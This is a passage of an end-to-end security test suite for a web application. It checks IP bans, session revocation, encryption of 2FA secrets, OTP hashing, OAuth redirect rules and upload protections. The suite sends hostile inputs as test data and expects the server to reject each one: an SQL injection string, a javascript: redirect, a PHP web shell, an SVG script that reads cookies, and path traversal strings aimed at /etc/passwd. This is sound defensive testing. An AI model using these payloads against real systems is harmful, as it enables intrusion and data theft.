				headers: { Cookie: `kulup_session_token=${adminSessionToken}` },
			});
			const siemTokenNegData = await siemTokenNegRes.json();
			const hasLocalToken = (siemTokenNegData.siem || []).some((l) => l.ip === '127.0.0.1');
			if (hasLocalToken) {
				throw new Error('SIEM smart search (-127.0.0.1) failed to exclude localhost records!');
			}
			log.ok('SIEM smart search (-127.0.0.1 word exclusion) verified successfully.');

			// 6.8 SoC API Subnet CIDR Security Boundary Test (/0 and trailing slashes must be rejected)
			const badCidrRes = await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					Cookie: `kulup_session_token=${adminSessionToken}`,
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ action: 'ban_ip', ip: '198.51.100.0/' }),
			});
			if (badCidrRes.status === 400) {
				log.ok('Invalid CIDR format (198.51.100.0/) safely rejected by API with 400.');
			} else {
				throw new Error(`Invalid CIDR was not rejected! HTTP: ${badCidrRes.status}`);
			}

			const broadCidrRes = await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					Cookie: `kulup_session_token=${adminSessionToken}`,
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ action: 'ban_ip', ip: '0.0.0.0/0' }),
			});
			if (broadCidrRes.status === 400) {
				log.ok('Overly broad subnet (/0 global lockout risk) blocked by API with 400.');
			} else {
				throw new Error(`Overly broad CIDR (/0) was not blocked! HTTP: ${broadCidrRes.status}`);
			}

			// 6.9 Global HTTP Security Headers Test (HSTS, COOP, CORP)
			const headersCheckRes = await fetch(`${BASE_URL}/api/kurulum`);
			const hsts = headersCheckRes.headers.get('strict-transport-security');
			const coop = headersCheckRes.headers.get('cross-origin-opener-policy');
			const corp = headersCheckRes.headers.get('cross-origin-resource-policy');
			if (!hsts || !coop || !corp) {
				throw new Error(`Global HTTP security headers missing! HSTS: ${hsts}, COOP: ${coop}, CORP: ${corp}`);
			}
			log.ok(`Global HTTP security headers (HSTS: ${hsts}, COOP: ${coop}, CORP: ${corp}) verified.`);

		} finally {
			await client.query('DELETE FROM users WHERE id = $1', [adminUserId]);
		}

		// -----------------------------------------------------------------------
		// SCENARIO 7: Deep Hardening and SoC Extension
		// -----------------------------------------------------------------------
		log.step(7, 'Deep Hardening and SoC Extension');

		const hardeningUserId = `usr_hardening_${Date.now()}`;
		const initialPassword = 'HardeningPass2026!';
		const initialPasswordHash = await bcrypt.hash(initialPassword, 10);
		const initialSessionToken = `init_tok_${crypto.randomBytes(16).toString('hex')}`;
		const hardeningExpiry = Date.now() + 7 * 86_400_000;

		// 7.1 Create User (Authorized with rol_admin)
		await client.query(
			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, totp_enabled, created_at)
			 VALUES ($1, 'Hardening', 'User', $2, $3, 'Software Engineering', 3, 'rol_admin', 'aktif', $4, $5, 0, $6)`,
			[hardeningUserId, `hardening_${Date.now()}@orbit.local`, initialPasswordHash, initialSessionToken, hardeningExpiry, Date.now()]
		);

		try {
			// 7.2 2FA TOTP Secret At-Rest AES-256-GCM Encryption & Transparent Verification Test
			const setup2faRes = await fetch(`${BASE_URL}/api/auth/2fa/setup`, {
				method: 'POST',
				headers: {
					Cookie: `kulup_session_token=${initialSessionToken}`,
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({}),
			});
			if (!setup2faRes.ok) {
				throw new Error(`2FA setup failed! HTTP Status: ${setup2faRes.status}`);
			}
			const setup2faData = await setup2faRes.json();
			if (!setup2faData.secret) {
				throw new Error('2FA setup did not return secret!');
			}
			const plaintextTotpSecret = setup2faData.secret;

			// Verify totp_secret in database: MUST NOT BE PLAINTEXT, MUST BE ENCRYPTED WITH enc:v1:!
			const dbTotpCheck = await client.query('SELECT totp_secret AS totpsecret FROM users WHERE id = $1', [hardeningUserId]);
			const storedSecretInDb = dbTotpCheck.rows[0]?.totpsecret || '';
			if (!storedSecretInDb.startsWith('enc:v1:')) {
				throw new Error(`2FA TOTP secret not encrypted with AES-256-GCM in PostgreSQL! Value: ${storedSecretInDb}`);
			}
			if (storedSecretInDb === plaintextTotpSecret || storedSecretInDb.includes(plaintextTotpSecret)) {
				throw new Error('2FA TOTP secret leaked as plaintext into database!');
			}
			log.ok(`2FA TOTP secret securely encrypted with AES-256-GCM (enc:v1:...) at-rest in database.`);

			// Generate TOTP code and enable (verify decryptSecret works transparently with otplib)
			const totpCode = await generateTotpToken({ secret: plaintextTotpSecret });
			const enable2faRes = await fetch(`${BASE_URL}/api/auth/2fa/enable`, {
				method: 'POST',
				headers: {
					Cookie: `kulup_session_token=${initialSessionToken}`,
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ code: totpCode }),
			});
			if (!enable2faRes.ok) {
				const errBody = await enable2faRes.text();
				throw new Error(`2FA enable failed! HTTP: ${enable2faRes.status}, Body: ${errBody}`);
			}
			const dbTotpEnabledCheck = await client.query('SELECT totp_enabled AS totpenabled FROM users WHERE id = $1', [hardeningUserId]);
			if (Number(dbTotpEnabledCheck.rows[0]?.totpenabled) !== 1) {
				throw new Error('2FA verification failed to set totp_enabled = 1!');
			}
			log.ok('Encrypted TOTP secret transparently decrypted, 6-digit code validated, and 2FA enabled successfully.');

			// 7.2b Backward Compatibility (Legacy Plaintext TOTP Secret) Test
			const legacySecret = 'JBSWY3DPEHPK3PXPJBSWY3DPEHPK3PXP';
			await client.query('UPDATE users SET totp_secret = $1 WHERE id = $2', [legacySecret, hardeningUserId]);
			const legacyTotpCode = await generateTotpToken({ secret: legacySecret });
			const legacyVerifyRes = await fetch(`${BASE_URL}/api/auth/2fa/enable`, {
				method: 'POST',
				headers: {
					Cookie: `kulup_session_token=${initialSessionToken}`,
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ code: legacyTotpCode }),
			});
			if (!legacyVerifyRes.ok) {
				const errBody = await legacyVerifyRes.text();
				throw new Error(`Legacy plaintext TOTP verification failed! HTTP: ${legacyVerifyRes.status}, Body: ${errBody}`);
			}
			log.ok('Backward compatibility verified: Unencrypted legacy TOTP secret transparently decrypted and validated.');

			// 7.3 Session Revocation and Fresh Session Issuance on Password Change
			const newPassword = 'NewHardenedPass2026!';
			const changePassRes = await fetch(`${BASE_URL}/api/profil/password`, {
				method: 'POST',
				headers: {
					Cookie: `kulup_session_token=${initialSessionToken}`,
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ mevcut: initialPassword, yeni: newPassword }),
			});
			if (!changePassRes.ok) {
				const errBody = await changePassRes.text();
				throw new Error(`Password change failed! HTTP: ${changePassRes.status}, Body: ${errBody}`);
			}
			const setCookieHeader = changePassRes.headers.get('set-cookie') || '';
			const matchCookie = setCookieHeader.match(/kulup_session_token=([^;]+)/);
			if (!matchCookie) {
				throw new Error('Password change did not set fresh session cookie (kulup_session_token)!');
			}
			const freshSessionToken = matchCookie[1];
			if (freshSessionToken === initialSessionToken) {
				throw new Error('Password change did not generate a fresh token, reused old token!');
			}

			// Old session token must be invalidated (must return 401)
			const oldSessionCheck = await fetch(`${BASE_URL}/api/profil`, {
				headers: { Cookie: `kulup_session_token=${initialSessionToken}` },
			});
			if (oldSessionCheck.status !== 401) {
				throw new Error(`Old session token still valid after password change! HTTP Status: ${oldSessionCheck.status}`);
			}
			log.ok('Old session token immediately revoked from database upon password change (HTTP 401).');

			// New session token must work seamlessly (must return 200)
			const newSessionCheck = await fetch(`${BASE_URL}/api/profil`, {
				headers: { Cookie: `kulup_session_token=${freshSessionToken}` },
			});
			if (!newSessionCheck.ok) {
				throw new Error(`Failed to read profile with fresh session token! HTTP Status: ${newSessionCheck.status}`);
			}
			log.ok('Fresh session token issued to current browser and seamless session preserved (HTTP 200).');

			// 7.4 SoC Live Rate-Limit Telemetry & 1-Click Unthrottle Test
			for (let i = 0; i < 6; i++) {
				await fetch(`${BASE_URL}/api/profil/password`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${freshSessionToken}`,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({ mevcut: 'YanlisSifre!', yeni: newPassword }),
				});
			}

			const socOverviewRes = await fetch(`${BASE_URL}/api/soc?action=overview`, {
				headers: { Cookie: `kulup_session_token=${freshSessionToken}` },
			});
			if (!socOverviewRes.ok) {
				throw new Error(`Failed to get SoC overview! HTTP: ${socOverviewRes.status}`);
			}
			const socOverviewData = await socOverviewRes.json();
			const activeRateLimits = socOverviewData.overview?.metrics?.activeRateLimits;
			if (!Array.isArray(activeRateLimits)) {
				throw new Error('activeRateLimits array not found in SoC overview.metrics!');
			}
			log.ok(`SoC live rate-limit telemetry verified (${activeRateLimits.length} active rate limit buckets tracked).`);

			const rateLimitKey = `password-change:${hardeningUserId}`;
			const unthrottleRes = await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					Cookie: `kulup_session_token=${freshSessionToken}`,
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ action: 'clear_rate_limit', key: rateLimitKey }),
			});
			if (!unthrottleRes.ok) {
				const errBody = await unthrottleRes.text();
				throw new Error(`SoC clear_rate_limit operation failed! HTTP: ${unthrottleRes.status}, Body: ${errBody}`);
			}
			const unthrottleData = await unthrottleRes.json();
			if (!unthrottleData.ok) {
				throw new Error('SoC clear_rate_limit did not return ok=true!');
			}
			log.ok(`SoC 1-Click Rate Limit Reset (clear_rate_limit) applied successfully for '${rateLimitKey}'.`);

			const postUnthrottleTest = await fetch(`${BASE_URL}/api/profil/password`, {
				method: 'POST',
				headers: {
					Cookie: `kulup_session_token=${freshSessionToken}`,
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ mevcut: 'YanlisSifre!', yeni: 'BaskaSifre123!' }),
			});
			if (postUnthrottleTest.status === 429) {
				throw new Error('Rate limit was not unthrottled after reset (HTTP 429)!');
			}
			log.ok('Rate limit lock immediately lifted after reset and requests accepted again.');

		} finally {
			await client.query('DELETE FROM users WHERE id = $1', [hardeningUserId]);
		}

		// -----------------------------------------------------------------------
		// SCENARIO 8: Advanced Vulnerability Scanning, Dual-Stack IPv6 CIDR, and Notes/OAuth Security
		// -----------------------------------------------------------------------
		log.step(8, 'Advanced Vulnerability Scanning, Dual-Stack IPv6 CIDR, and Notes/OAuth Security');

		// 8.1 Dual-Stack IPv6 CIDR Subnet Quarantine Test
		const testIpv6Cidr = '2001:db8:abcd::/48';
		const ipv6BannedTarget = '2001:db8:abcd::1';
		const ipv6AllowedTarget = '2001:db8:beef::1';

		const testAdminId = crypto.randomUUID();
		const testAdminSessionToken = crypto.randomBytes(32).toString('hex');
		await client.query(
			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, totp_enabled, created_at, last_login_ip)
			 VALUES ($1, 'Admin', 'Hardening', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber Savunma', 4, 'rol_admin', 'aktif', $3, $4, 1, $5, '127.0.0.1')`,
			[testAdminId, `e2e_hard_admin_${Date.now()}@orbit.local`, testAdminSessionToken, Date.now() + 24 * 3600 * 1000, Date.now()]
		);

		try {
			// Add IPv6 CIDR ban
			const addIpv6BanRes = await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					Cookie: `kulup_session_token=${testAdminSessionToken}`,
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ action: 'ban', ip: testIpv6Cidr, reason: 'E2E IPv6 CIDR Karantina Testi' }),
			});
			if (!addIpv6BanRes.ok) {
				const b = await addIpv6BanRes.text();
				throw new Error(`Failed to add IPv6 CIDR ban! HTTP: ${addIpv6BanRes.status}, Body: ${b}`);
			}
			log.ok(`IPv6 CIDR subnet (${testIpv6Cidr}) successfully added to SoC firewall.`);

			// Request from quarantined IPv6 subnet must be blocked with 403
			const ipv6BlockedRes = await fetch(`${BASE_URL}/api/public/v1/news`, {
				headers: { 'X-Forwarded-For': ipv6BannedTarget },
			});
			if (ipv6BlockedRes.status !== 403) {
				throw new Error(`IP in IPv6 CIDR subnet (${ipv6BannedTarget}) was not blocked! HTTP: ${ipv6BlockedRes.status}`);
			}
			log.ok(`IP (${ipv6BannedTarget}) under IPv6 CIDR (${testIpv6Cidr}) automatically blocked with 403.`);

			// IPv6 outside subnet should access normally
			const ipv6AllowedRes = await fetch(`${BASE_URL}/api/public/v1/news`, {
				headers: { 'X-Forwarded-For': ipv6AllowedTarget },
			});
			if (!ipv6AllowedRes.ok) {
				throw new Error(`IPv6 outside subnet (${ipv6AllowedTarget}) was blocked! HTTP: ${ipv6AllowedRes.status}`);
			}
			log.ok(`IPv6 outside subnet (${ipv6AllowedTarget}) accessed successfully (HTTP 200).`);

			// Remove IPv6 ban
			await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					Cookie: `kulup_session_token=${testAdminSessionToken}`,
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ action: 'unban', ip: testIpv6Cidr }),
			});

			// 8.2 Notes & Folders IDOR Shield Test
			const userAId = crypto.randomUUID();
			const userASession = crypto.randomBytes(32).toString('hex');
			const userBId = crypto.randomUUID();
			const userBSession = crypto.randomBytes(32).toString('hex');

			await client.query(
				`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, created_at)
				 VALUES ($1, 'User', 'A', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Bilgisayar', 3, 'rol_uye', 'aktif', $3, $4, $5),
				        ($6, 'User', 'B', $7, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Elektrik', 2, 'rol_uye', 'aktif', $8, $4, $5)`,
				[
					userAId, `user_a_${Date.now()}@orbit.local`, userASession, Date.now() + 3600000, Date.now(),
					userBId, `user_b_${Date.now()}@orbit.local`, userBSession
				]
			);

			try {
				// User A creates their own note
				const noteAId = `not_a_${Date.now()}`;
				const createNoteRes = await fetch(`${BASE_URL}/api/notlar`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${userASession}`,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({
						id: noteAId,
						baslik: 'User A Confidential Note',
						icerik: 'Top secret project plans.',
					}),
				});
				if (!createNoteRes.ok) {
					throw new Error(`User A could not create note! HTTP: ${createNoteRes.status}`);
				}
				log.ok(`Original note created for User A (ID: ${noteAId}).`);

				// User B attempts to overwrite User A note using their own session (IDOR)
				const idorNoteRes = await fetch(`${BASE_URL}/api/notlar`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${userBSession}`,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({
						id: noteAId,
						baslik: 'PWNED by User B',
						icerik: 'Zafiyet bulundu ve ezildi.',
					}),
				});
				if (idorNoteRes.status !== 403) {
					throw new Error(`IDOR note overwrite attempt was not blocked with 403! HTTP: ${idorNoteRes.status}`);
				}
				log.ok(`Notes IDOR attack attempt (User B -> User A note) repelled with 403 Forbidden.`);

				// Verify original note was not corrupted in database
				const checkNoteDb = await client.query('SELECT baslik, userid FROM user_notes WHERE id = $1', [noteAId]);
				if (checkNoteDb.rows.length === 0 || checkNoteDb.rows[0].baslik !== 'User A Confidential Note') {
					throw new Error('User A note was overwritten in IDOR attack!');
				}
				log.ok('Database inspection: Original note content and ownership verified intact.');

				// 8.3 Secure Logout and Terminal PTY Cleanup Test
				const logoutRes = await fetch(`${BASE_URL}/api/auth/logout`, {
					method: 'POST',
					headers: { Cookie: `kulup_session_token=${userASession}` },
				});
				if (!logoutRes.ok) {
					throw new Error(`Logout request failed! HTTP: ${logoutRes.status}`);
				}
				log.ok('Secure logout (POST /api/auth/logout) completed successfully.');

				// Verify session deleted from database (profile should no longer be readable)
				const postLogoutProfileRes = await fetch(`${BASE_URL}/api/profil`, {
					headers: { Cookie: `kulup_session_token=${userASession}` },
				});
				if (postLogoutProfileRes.status !== 401) {
					throw new Error('Old session still valid despite logout!');
				}
				log.ok('Old session token returned 401 Unauthorized after logout and was revoked.');

				// 8.4 Passkey Login Options WAF & Quarantine Protection Test
				const bannedIpForPasskey = '198.51.100.222';
				const banRes = await fetch(`${BASE_URL}/api/soc`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${testAdminSessionToken}`,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({ action: 'ban', ip: bannedIpForPasskey, neden: 'Passkey Test Ban' }),
				});
				if (!banRes.ok) {
					const t = await banRes.text();
					throw new Error(`SoC ban request failed: HTTP ${banRes.status}: ${t}`);
				}

				// Wait for firewall cache (1000ms TTL) to refresh across Next.js workers
				await new Promise((r) => setTimeout(r, 1200));

				const passkeyBannedRes = await fetch(`${BASE_URL}/api/auth/passkey/login/options`, {
					method: 'POST',
					headers: {
						'CF-Connecting-IP': bannedIpForPasskey,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({ email: 'test@example.com' }),
				});
				if (passkeyBannedRes.status !== 403) {
					throw new Error(`Quarantined IP was not blocked on Passkey login options endpoint! HTTP: ${passkeyBannedRes.status}`);
				}
				log.ok('Quarantined IP blocked from Passkey login options endpoint with 403.');

				// WAF SQLi payload must be blocked on passkey options
				const passkeyWafRes = await fetch(`${BASE_URL}/api/auth/passkey/login/options`, {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({ email: "admin' UNION SELECT 1,2,3--" }),
				});
				if (passkeyWafRes.status !== 403) {
					throw new Error(`SQLi in Passkey options body was not blocked by WAF! HTTP: ${passkeyWafRes.status}`);
				}
				log.ok('Malicious payload in Passkey login options body blocked by WAF with 403.');

				// 8.5 RFC 6749 OAuth Redirect URI Scheme Security Test
				const evilRedirectRes = await fetch(`${BASE_URL}/api/oauth/clients`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${testAdminSessionToken}`,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({
						ad: 'Evil App',
						redirectUris: ['javascript:alert(1)'],
					}),
				});
				if (evilRedirectRes.status !== 400) {
					throw new Error(`Insecure javascript: redirect URI was not blocked! HTTP: ${evilRedirectRes.status}`);
				}
				log.ok('Insecure redirect URI scheme (javascript:alert(1)) rejected with 400 per RFC 6749.');

				const insecureHttpRedirectRes = await fetch(`${BASE_URL}/api/oauth/clients`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${testAdminSessionToken}`,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({
						ad: 'Insecure Remote HTTP App',
						redirectUris: ['http://evil-external-domain.com/callback'],
					}),
				});
				if (insecureHttpRedirectRes.status !== 400) {
					throw new Error(`Remote insecure HTTP redirect URI was not blocked! HTTP: ${insecureHttpRedirectRes.status}`);
				}
				log.ok('Remote insecure HTTP redirect URI (RFC 6749 Section 3.1.2) rejected with 400.');

				const validOAuthRes = await fetch(`${BASE_URL}/api/oauth/clients`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${testAdminSessionToken}`,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({
						ad: 'Valid Local Dev App',
						redirectUris: ['http://localhost:8080/callback', 'https://app.example.com/oauth/callback'],
					}),
				});
				if (!validOAuthRes.ok) {
					const b = await validOAuthRes.text();
					throw new Error(`Failed to create valid OAuth client! HTTP: ${validOAuthRes.status}, Body: ${b}`);
				}
				const validOAuthData = await validOAuthRes.json();
				log.ok(`Valid localhost HTTP and remote HTTPS redirect URI client registered successfully (${validOAuthData.client.id}).`);

				// Cleanup
				await client.query('DELETE FROM oauth_clients WHERE id = $1', [validOAuthData.client.id]);
				await client.query('DELETE FROM security_blocks WHERE ip = $1', [bannedIpForPasskey]);
			} finally {
				await client.query('DELETE FROM user_notes WHERE userid IN ($1, $2)', [userAId, userBId]).catch(() => {});
				await client.query('DELETE FROM users WHERE id IN ($1, $2)', [userAId, userBId]);
			}
		} finally {
			await client.query('DELETE FROM users WHERE id = $1', [testAdminId]);
			await client.query('DELETE FROM security_blocks WHERE ip = $1', [testIpv6Cidr]);
			await client.query("DELETE FROM security_blocks WHERE ip = '198.51.100.222'").catch(() => {});
		}

		// =====================================================================
		// SCENARIO 9: Registration & Verification System Hardening
		// (Hashed OTP, Bot Honeypot, 23505 Unique Violation, Sweeper)
		// =====================================================================
		console.log(`\n${c.bold}${c.cyan}[SCENARIO 9] Registration & Verification System Hardening...${c.reset}`);

		const botIp = '198.51.100.233';
		const honeypotRes = await fetch(`${BASE_URL}/api/auth/register`, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
				'X-Forwarded-For': botIp,
			},
			body: JSON.stringify({
				ad: 'Bot',
				soyad: 'Spammer',
				email: 'bot_spam@example.com',
				password: 'Password123!@#',
				ogrenciNo: '24010108899',
				bolum: 'Computer Science & Engineering',
				sinif: 1,
				acceptedDocumentIds: ['legal_terms', 'legal_privacy', 'legal_cookies'],
				kvkkKabul: true,
				hp_website: 'https://malicious-spam-bot.xyz',
			}),
		});
		if (honeypotRes.status !== 400) {
			throw new Error(`Request filling bot honeypot field was not blocked with 400! HTTP: ${honeypotRes.status}`);
		}
		const honeypotData = await honeypotRes.json();
		if (!honeypotData.bot_detected) {
			throw new Error(`Expected bot_detected flag in bot detection response: ${JSON.stringify(honeypotData)}`);
		}
		log.ok('Spam bot filling hidden honeypot field caught immediately and repelled with 400.');

		// 9.2 At-Rest SHA-256 Hashed OTP Verification (Registration Step 1)
		const regTestEmail = `e2e_reg_otp_${Date.now()}@orbit.local`;
		const regTestOgrenciNo = String(Date.now()).slice(-11);
		const regStep1Res = await fetch(`${BASE_URL}/api/auth/register`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				ad: 'Guvenli',
				soyad: 'Aday',
				email: regTestEmail,
				password: 'SecureP@ssw0rd2026!',
				ogrenciNo: regTestOgrenciNo,
				bolum: 'Computer Science & Engineering',
				sinif: 2,
				acceptedDocumentIds: ['legal_terms', 'legal_privacy', 'legal_cookies'],
				kvkkKabul: true,
				hp_website: '',
			}),
		});
		if (!regStep1Res.ok) {
			const b = await regStep1Res.text();
			throw new Error(`Registration step 1 (OTP generation) failed! HTTP ${regStep1Res.status}, Body: ${b}`);
		}
		const regStep1Data = await regStep1Res.json();
		if (!regStep1Data.requireVerification) {
			throw new Error(`Registration step 1 did not return requireVerification! ${JSON.stringify(regStep1Data)}`);
		}

		// Verify OTP record in database: code must be hashed with SHA-256
		const otpDbRes = await client.query(
			'SELECT code, expires_at FROM email_verifications WHERE email = $1 AND type = $2',
			[regTestEmail, 'registration']
		);
		if (otpDbRes.rowCount === 0) {
			throw new Error('No record found in email_verifications table!');
		}
		const storedOtpHash = otpDbRes.rows[0].code;
		if (!storedOtpHash.startsWith('sha256:') || storedOtpHash.length !== 71) {
			throw new Error(`OTP not stored in SHA-256 hash format (sha256:<64 hex>) in database! Value: ${storedOtpHash}`);
		}
		log.ok(`Verification OTP code securely hashed at-rest with SHA-256 in database (${storedOtpHash.slice(0, 16)}...).`);

		// 9.3 Hashed OTP Verification and Registration Completion (Registration Step 2)
		// Store known OTP hash in DB for testing
		const testOtpCode = '839217';
		const testOtpHash = 'sha256:' + crypto.createHash('sha256').update(testOtpCode).digest('hex');
		await client.query(
			'UPDATE email_verifications SET code = $1 WHERE email = $2 AND type = $3',
			[testOtpHash, regTestEmail, 'registration']
		);

		const regStep2Res = await fetch(`${BASE_URL}/api/auth/register`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				ad: 'Guvenli',
				soyad: 'Aday',
				email: regTestEmail,
				password: 'SecureP@ssw0rd2026!',
				ogrenciNo: regTestOgrenciNo,
				bolum: 'Computer Science & Engineering',
				sinif: 2,
				acceptedDocumentIds: ['legal_terms', 'legal_privacy', 'legal_cookies'],
				kvkkKabul: true,
				verificationCode: testOtpCode,
				hp_website: '',
			}),
		});
		if (!regStep2Res.ok) {
			const b = await regStep2Res.text();
			throw new Error(`Registration step 2 (OTP verification) failed! HTTP ${regStep2Res.status}, Body: ${b}`);
		}
		const regStep2Data = await regStep2Res.json();
		if (!regStep2Data.user || regStep2Data.user.email !== regTestEmail) {
			throw new Error(`Registration step 2 did not return expected user! ${JSON.stringify(regStep2Data)}`);
		}
		log.ok(`6-digit OTP code verified with timing-safe SHA-256 and user created in 'pending' status.`);

		// Verify OTP row deleted after successful verification
		const postVerifyOtp = await client.query(
			'SELECT * FROM email_verifications WHERE email = $1',
			[regTestEmail]
		);
		if (postVerifyOtp.rowCount !== 0) {
			throw new Error('email_verifications record was not deleted after successful registration!');
		}
		log.ok('Used OTP record immediately purged from email_verifications table upon successful registration.');

		// 9.4 Automatic Sweeping of Expired Legacy OTPs Test
		const staleEmail = `stale_otp_${Date.now()}@orbit.local`;
		await client.query(
			`INSERT INTO email_verifications (email, code, type, expires_at, created_at)
			 VALUES ($1, 'sha256:stale', 'registration', $2, $3)`,
			[staleEmail, Date.now() - 100000, Date.now() - 100000]
		);

		// When another registration request is triggered, expired records should be swept
		const dummyEmail = `dummy_sweep_${Date.now()}@orbit.local`;
		await fetch(`${BASE_URL}/api/auth/register`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				ad: 'Sweep',
				soyad: 'Test',
				email: dummyEmail,
				password: 'SecureP@ssw0rd2026!',
				ogrenciNo: String(Date.now() + 1).slice(-11),
				bolum: 'Computer Science & Engineering',
				sinif: 1,
				acceptedDocumentIds: ['legal_terms', 'legal_privacy', 'legal_cookies'],
				kvkkKabul: true,
			}),
		});

		const staleCheckRes = await client.query(
			'SELECT * FROM email_verifications WHERE email = $1',
			[staleEmail]
		);
		if (staleCheckRes.rowCount !== 0) {
			throw new Error('Expired legacy OTP record was not automatically purged!');
		}
		log.ok('Expired legacy OTP records automatically swept (database bloat prevented).');

		// 9.5 Concurrent / Duplicate Registration (23505 Unique Violation) Handling Test
		const duplicateRegRes = await fetch(`${BASE_URL}/api/auth/register`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				ad: 'Tekrar',
				soyad: 'Aday',
				email: regTestEmail,
				password: 'SecureP@ssw0rd2026!',
				ogrenciNo: regTestOgrenciNo,
				bolum: 'Computer Science & Engineering',
				sinif: 2,
				acceptedDocumentIds: ['legal_terms', 'legal_privacy', 'legal_cookies'],
				kvkkKabul: true,
			}),
		});
		if (duplicateRegRes.status !== 409) {
			throw new Error(`Application with already registered email/handle did not return 409 Conflict! HTTP: ${duplicateRegRes.status}`);
		}
		log.ok('Existing email or handle collision (23505) cleanly handled with HTTP 409 Conflict.');

		// Cleanup
		await client.query('DELETE FROM email_verifications WHERE email IN ($1, $2, $3)', [regTestEmail, staleEmail, dummyEmail]).catch(() => {});
		await client.query('DELETE FROM users WHERE email IN ($1, $2)', [regTestEmail, dummyEmail]);
		await client.query('DELETE FROM security_blocks WHERE ip = $1', [botIp]);

		// =====================================================================
		// SCENARIO 10: File Upload Security (MIME Sniffing & Path Traversal)
		// =====================================================================
		console.log(`\n${c.bold}${c.cyan}[SCENARIO 10] File Upload & Path Traversal Security Verification...${c.reset}`);

		// 10.1 Unauthenticated file upload must be blocked (401/403)
		const unauthUploadRes = await fetch(`${BASE_URL}/api/upload`, {
			method: 'POST',
		});
		if (unauthUploadRes.status !== 401 && unauthUploadRes.status !== 403) {
			throw new Error(`Unauthenticated file upload was not blocked! HTTP: ${unauthUploadRes.status}`);
		}
		log.ok(`Unauthenticated /api/upload call blocked with ${unauthUploadRes.status}.`);

		// 10.2 Malicious extension (PHP, Shell, SVG XSS) upload attempt with admin session
		const uploadAdminId = crypto.randomUUID();
		const uploadAdminToken = crypto.randomBytes(32).toString('hex');
		await client.query(
			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, totp_enabled, created_at)
			 VALUES ($1, 'Upload', 'Admin', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber Savunma', 4, 'rol_admin', 'aktif', $3, $4, 1, $5)`,
			[uploadAdminId, `e2e_uploader_${Date.now()}@orbit.local`, uploadAdminToken, Date.now() + 3600000, Date.now()]
		);

		try {
			// Synthetic PHP web shell upload attempt (MIME sniffing shield)
			const fakePhpPayload = new FormData();
			const phpBlob = new Blob(['<?php system($_GET["cmd"]); ?>'], { type: 'application/x-php' });
			fakePhpPayload.append('file', phpBlob, 'shell.php');

			const uploadPhpRes = await fetch(`${BASE_URL}/api/upload`, {
				method: 'POST',
				headers: { Cookie: `kulup_session_token=${uploadAdminToken}` },
				body: fakePhpPayload,
			});
			if (uploadPhpRes.status !== 415) {
				throw new Error(`Malicious web shell file was not rejected with 415 Unsupported Media Type! HTTP: ${uploadPhpRes.status}`);
			}
			log.ok('Malicious PHP web shell upload attempt rejected with 415 by magic bytes (MIME sniffing) guard.');

			// SVG XSS file upload attempt
			const svgPayload = new FormData();
			const svgBlob = new Blob(['<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>'], { type: 'image/svg+xml' });
			svgPayload.append('file', svgBlob, 'exploit.svg');

			const uploadSvgRes = await fetch(`${BASE_URL}/api/upload`, {
				method: 'POST',
				headers: { Cookie: `kulup_session_token=${uploadAdminToken}` },
				body: svgPayload,
			});
			if (uploadSvgRes.status !== 415) {
				throw new Error(`SVG script injection file was not rejected with 415! HTTP: ${uploadSvgRes.status}`);
			}
			log.ok('SVG XSS / script injection file rejected with 415 per strict format and extension policy.');

			// 10.3 Path Traversal attempt on /api/uploads/
			const traversalPaths = [
				'/api/uploads/../../etc/passwd',
				'/api/uploads/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
				'/api/uploads/invalid_name.php',
				'/api/uploads/123_abc.jpg',
			];
			for (const p of traversalPaths) {
				const trRes = await fetch(`${BASE_URL}${p}`);
				if (trRes.status !== 404) {
